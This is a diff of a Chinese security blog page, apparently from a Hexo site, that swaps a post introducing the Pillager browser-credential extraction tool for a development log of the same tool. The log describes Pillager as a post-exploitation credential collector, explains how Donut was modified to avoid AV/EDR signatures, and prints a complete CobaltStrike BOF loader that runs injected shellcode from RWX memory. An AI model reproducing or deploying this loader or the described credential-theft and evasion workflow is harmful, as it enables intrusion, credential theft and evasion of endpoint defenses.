@@ -16,24 +16,24 @@
   <meta name="author" content="qwqdanchun">
   <meta name="keywords" content="">
   
-    <meta name="description" content="Pillager 介绍这是一个浏览器信息提取工具，将会长期维护，如果有任何问题或建议，欢迎发issues 在整理工具的过程中，发现目前的浏览器信息提取工具，普遍存在各种问题，最常见的如体积过大，缺少维护，Chrome提取都有可能存在问题，于是自己在现有工具的基础上进行整理，得到了这款工具 目前支持：  IE&#x2F;旧版Edge的密码，书签，历史记录提取 Chromium系浏览器的密码，书签，历">
+    <meta name="description" content="今年上半年，在开发 CobaltStrike 插件期间，没用遇到合适且长期更新的信息收集工具，便决定自己制作一款，也就有了Pillager项目。 这款工具旨在收集机器上浏览器，聊天软件，已经其他常用工具的凭证、记录等敏感信息，从而进行进一步的后渗透工作。 思路的确定最初的想法只是为了制作一个小巧简介的 BOF ，但是后期研究发现使用 BOF 开发并不合适，综合考虑下选择了使用C#开发。进而就要考虑">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Pillager-一个浏览器信息提取工具">
-<meta property="og:url" content="https://blog.qwqdanchun.com/Pillager/index.html">
+<meta property="og:title" content="Pillager开发记录-1">
+<meta property="og:url" content="https://blog.qwqdanchun.com/Pillager_Forensics_1/index.html">
 <meta property="og:site_name" content="簞純&#39;s Blog">
-<meta property="og:description" content="Pillager 介绍这是一个浏览器信息提取工具，将会长期维护，如果有任何问题或建议，欢迎发issues 在整理工具的过程中，发现目前的浏览器信息提取工具，普遍存在各种问题，最常见的如体积过大，缺少维护，Chrome提取都有可能存在问题，于是自己在现有工具的基础上进行整理，得到了这款工具 目前支持：  IE&#x2F;旧版Edge的密码，书签，历史记录提取 Chromium系浏览器的密码，书签，历">
+<meta property="og:description" content="今年上半年，在开发 CobaltStrike 插件期间，没用遇到合适且长期更新的信息收集工具，便决定自己制作一款，也就有了Pillager项目。 这款工具旨在收集机器上浏览器，聊天软件，已经其他常用工具的凭证、记录等敏感信息，从而进行进一步的后渗透工作。 思路的确定最初的想法只是为了制作一个小巧简介的 BOF ，但是后期研究发现使用 BOF 开发并不合适，综合考虑下选择了使用C#开发。进而就要考虑">
 <meta property="og:locale" content="zh_CN">
-<meta property="article:published_time" content="2023-04-24T23:38:14.000Z">
-<meta property="article:modified_time" content="2023-09-06T11:36:55.064Z">
+<meta property="article:published_time" content="2023-04-14T21:40:56.000Z">
+<meta property="article:modified_time" content="2023-11-09T19:20:08.535Z">
 <meta property="article:author" content="qwqdanchun">
-<meta property="article:tag" content="Tools">
+<meta property="article:tag" content="Forensics">
 <meta name="twitter:card" content="summary_large_image">
   
   
     <meta name="referrer" content="no-referrer-when-downgrade">
   
   
-  <title>Pillager-一个浏览器信息提取工具 - 簞純&#39;s Blog</title>
+  <title>Pillager开发记录-1 - 簞純&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -210,7 +210,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Pillager-一个浏览器信息提取工具"></span>
+            <span id="subtitle" data-typed-text="Pillager开发记录-1"></span>
           
         </div>
 
@@ -226,8 +226,8 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-04-25 07:38" pubdate>
-          2023年4月25日 早上
+        <time datetime="2023-04-15 05:40" pubdate>
+          2023年4月15日 凌晨
         </time>
       </span>
     
@@ -238,7 +238,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          376 字
+          2k 字
         
       </span>
     
@@ -249,7 +249,7 @@
         
         
         
-          4 分钟
+          17 分钟
         
       </span>
     
@@ -302,17 +302,17 @@
     
     <div class="category row nomargin-x">
       <a class="category-item 
-          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="Tools"
-        id="heading-8625e1de7be14c39b1d14dc03d822497" role="tab" data-toggle="collapse" href="#collapse-8625e1de7be14c39b1d14dc03d822497"
+          list-group-item category-item-action col-10 col-md-11 col-xm-11" title="Forensics"
+        id="heading-9759d20db6b94132676173d6d2302ff4" role="tab" data-toggle="collapse" href="#collapse-9759d20db6b94132676173d6d2302ff4"
         aria-expanded="true"
       >
-        Tools
-        <span class="list-group-count">(1)</span>
+        Forensics
+        <span class="list-group-count">(2)</span>
         <i class="iconfont icon-arrowright"></i>
       </a>
       
-      <div class="category-collapse collapse show" id="collapse-8625e1de7be14c39b1d14dc03d822497"
-           role="tabpanel" aria-labelledby="heading-8625e1de7be14c39b1d14dc03d822497">
+      <div class="category-collapse collapse show" id="collapse-9759d20db6b94132676173d6d2302ff4"
+           role="tabpanel" aria-labelledby="heading-9759d20db6b94132676173d6d2302ff4">
         
         
           
@@ -321,10 +321,19 @@
     
       
       
-        <a href="/Pillager/" title="Pillager-一个浏览器信息提取工具"
+        <a href="/Pillager_Forensics_1/" title="Pillager开发记录-1"
            class="list-group-item list-group-item-action
            active">
-          <span class="category-post">Pillager-一个浏览器信息提取工具</span>
+          <span class="category-post">Pillager开发记录-1</span>
+        </a>
+      
+    
+      
+      
+        <a href="/Telegram_Forensics/" title="Telegram取证相关的记录"
+           class="list-group-item list-group-item-action
+           ">
+          <span class="category-post">Telegram取证相关的记录</span>
         </a>
       
     
@@ -347,12 +356,12 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Pillager-一个浏览器信息提取工具</h1>
+            <h1 style="display: none">Pillager开发记录-1</h1>
             
               <p class="note note-info">
                 
                   
-                    本文最后更新于：2023年9月6日 晚上
+                    本文最后更新于：2023年11月10日 凌晨
                   
                 
               </p>
@@ -360,18 +369,18 @@
             
               <div class="markdown-body">
                 
-                <h1 id="Pillager"><a href="#Pillager" class="headerlink" title="Pillager"></a>Pillager</h1><p><img src="data:image;base64,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" srcset="/img/loading.gif" lazyload alt="Pillager"></p>
-<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><p>这是一个浏览器信息提取工具，将会长期维护，如果有任何问题或建议，欢迎发issues</p>
-<p>在整理工具的过程中，发现目前的浏览器信息提取工具，普遍存在各种问题，最常见的如体积过大，缺少维护，Chrome提取都有可能存在问题，于是自己在现有工具的基础上进行整理，得到了这款工具</p>
-<p>目前支持：</p>
-<ul>
-<li>IE&#x2F;旧版Edge的密码，书签，历史记录提取</li>
-<li>Chromium系浏览器的密码，书签，历史记录，cookies提取</li>
-</ul>
-<p>后续将会陆续添加支持的浏览器</p>
-<h2 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h2><p>体积小，长期维护，shellcode兼容.Net Framework 2.x&#x2F;3.x&#x2F;4.x , shellcode兼容x86&#x2F;x64</p>
-<h2 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h2><p><a target="_blank" rel="noopener" href="https://github.com/qwqdanchun/Pillager">https://github.com/qwqdanchun/Pillager</a></p>
-<p>Release有Github Action自动编译的exe，可以直接使用</p>
+                <p>今年上半年，在开发 CobaltStrike 插件期间，没用遇到合适且长期更新的信息收集工具，便决定自己制作一款，也就有了<a target="_blank" rel="noopener" href="https://github.com/qwqdanchun/Pillager">Pillager</a>项目。</p>
+<p>这款工具旨在收集机器上浏览器，聊天软件，已经其他常用工具的凭证、记录等敏感信息，从而进行进一步的后渗透工作。</p>
+<h1 id="思路的确定"><a href="#思路的确定" class="headerlink" title="思路的确定"></a>思路的确定</h1><p>最初的想法只是为了制作一个小巧简介的 BOF ，但是后期研究发现使用 BOF 开发并不合适，综合考虑下选择了使用C#开发。进而就要考虑内存执行 C# 的问题，以及 C# 不可避免的 CLR 环境兼容问题。这时我就想到了 <a target="_blank" rel="noopener" href="https://github.com/TheWover/donut">Donut</a> 工具，使用其打包 shellcode 可以制作一个很简单的 BOF 去加载 shellcode 。</p>
+<h1 id="CLR环境兼容问题"><a href="#CLR环境兼容问题" class="headerlink" title="CLR环境兼容问题"></a>CLR环境兼容问题</h1><p>这里其实解决起来很简单，用到了之前写 C# 马时就曾经使用过的一个小技巧，也就是 .Net Framework v3.5 生成的文件，修改其 MetaData Header 中的 VersionString 为 <code>v4.0.30319</code>即可在 v4.x 的环境下正常使用。</p>
+<p>经过测试，系统会根据这个字符串指定 CLR 版本，在手动加载 CLR 环境并加载 Assembly 时，只要自己指定正确版本即可，无需修改字符串。</p>
+<p>当然，这样做对开发时使用的库有一定的要求，需要尽量避免使用第三方库，但是这种问题就很好解决了。</p>
+<h1 id="Donut相关"><a href="#Donut相关" class="headerlink" title="Donut相关"></a>Donut相关</h1><p>Donut 本身就是一个很完善的项目，但是对于此处使用，仍然有一些可以改进的地方，首先是在 Donut 内完成了上文的 CLR 兼容，其次是删除了与 .Net 加载无关的代码，并处理了两处 Donut 被 AV&#x2F;EDR 标记的静态特征，最大程度的保证了可用性和体积的最小化</p>
+<h1 id="BOF加载器"><a href="#BOF加载器" class="headerlink" title="BOF加载器"></a>BOF加载器</h1><p>为了方便 CobaltStrike 使用，我制作了一个非常简单的 BOF 去加载生成的 shellcode ，后期有需要，也可以对此进行更改以避免分配 RWX 内存的行为</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;windows.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;beacon.h&quot;</span></span><br><br>DECLSPEC_IMPORT LPVOID   WINAPI   KERNEL32$VirtualAlloc(LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);<br>DECLSPEC_IMPORT BOOL     WINAPI   KERNEL32$WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesWritten);<br>DECLSPEC_IMPORT HANDLE WINAPI KERNEL32$CreateThread(LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);<br>DECLSPEC_IMPORT HANDLE  WINAPI KERNEL32$GetCurrentProcess (VOID);<br><br>VOID <span class="hljs-title function_">go</span><span class="hljs-params">( </span><br><span class="hljs-params">	IN PCHAR Buffer, </span><br><span class="hljs-params">	IN ULONG Length </span><br><span class="hljs-params">)</span> <br>&#123;<br>    datap   parser;<br>    LPBYTE  lpShellcodeBuffer = <span class="hljs-literal">NULL</span>;<br>    DWORD   dwShellcodeBufferSize = <span class="hljs-number">0</span>;<br>    LPVOID pMem;<br>    SIZE_T bytesWritten = <span class="hljs-number">0</span>;<br>    DWORD dwThreadId = <span class="hljs-number">0</span>;<br><br>    BeaconDataParse(&amp;parser, Buffer, Length);<br>    lpShellcodeBuffer = (LPBYTE) BeaconDataExtract(&amp;parser, (<span class="hljs-type">int</span>*)(&amp;dwShellcodeBufferSize));<br>    pMem = KERNEL32$VirtualAlloc(<span class="hljs-number">0</span>, dwShellcodeBufferSize,MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);<br>    KERNEL32$WriteProcessMemory(KERNEL32$GetCurrentProcess(), pMem, lpShellcodeBuffer, dwShellcodeBufferSize, &amp;bytesWritten);<br>    KERNEL32$CreateThread(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, pMem, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, &amp;dwThreadId);<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<h1 id="结论"><a href="#结论" class="headerlink" title="结论"></a>结论</h1><p>至此，基本的准备工作已经就绪，后续我会陆续的更新文章，介绍各个收集目标的具体原理及使用方法</p>
+<p>此工具开源于 <a target="_blank" rel="noopener" href="https://github.com/qwqdanchun/Pillager">https://github.com/qwqdanchun/Pillager</a> ，欢迎大家关注和使用</p>
 
                 
               </div>
@@ -390,7 +399,7 @@
     
       <span class="category-chain">
         
-  <a href="/categories/Tools/" class="category-chain-item">Tools</a>
+  <a href="/categories/Forensics/" class="category-chain-item">Forensics</a>
   
   
 
@@ -405,7 +414,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/Tools/">#Tools</a>
+        <a href="/tags/Forensics/">#Forensics</a>
       
     </div>
   
@@ -417,8 +426,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Pillager-一个浏览器信息提取工具</div>
-      <div>https://blog.qwqdanchun.com/Pillager/</div>
+      <div>Pillager开发记录-1</div>
+      <div>https://blog.qwqdanchun.com/Pillager_Forensics_1/</div>
     </div>
     <div class="license-meta">
       
@@ -430,13 +439,13 @@
       
         <div class="license-meta-item license-meta-date">
           <div>发布于</div>
-          <div>2023年4月25日</div>
+          <div>2023年4月15日</div>
         </div>
       
       
         <div class="license-meta-item license-meta-date">
           <div>更新于</div>
-          <div>2023年9月6日</div>
+          <div>2023年11月10日</div>
         </div>
       
       
@@ -502,8 +511,8 @@
     
       <script type="text/javascript">
         var disqus_config = function() {
-          this.page.url = 'https://blog.qwqdanchun.com/Pillager/';
-          this.page.identifier = '/Pillager/';
+          this.page.url = 'https://blog.qwqdanchun.com/Pillager_Forensics_1/';
+          this.page.identifier = '/Pillager_Forensics_1/';
         };
         Fluid.utils.loadComments('#disqus_thread', function() {
           var d = document, s = d.createElement('script');
